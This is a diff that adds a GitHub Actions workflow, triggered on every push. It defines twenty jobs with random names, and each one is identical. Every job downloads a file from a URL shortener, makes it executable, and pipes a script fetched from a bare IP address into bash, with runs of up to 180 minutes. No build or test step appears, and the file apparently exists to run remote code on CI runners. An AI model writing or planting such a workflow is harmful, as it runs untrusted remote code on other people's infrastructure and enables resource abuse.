@@ -1,0 +1,163 @@
+name: sahaho
+on: push
+jobs:
+  rirarade:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  tevodabi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  biruze:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  jayeno:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  viyogude:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  lubani:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  febowiki:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  wixota:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  kesiro:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  juhuke:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  milovo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  losoji:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  vojebi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  tijuxo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  huvovu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  cahaziwa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  haxixaju:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  tamude:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  xodonade:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
+  jinibe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.174.115.128/mandalorian/npysxlw.php?a=huga | bash -
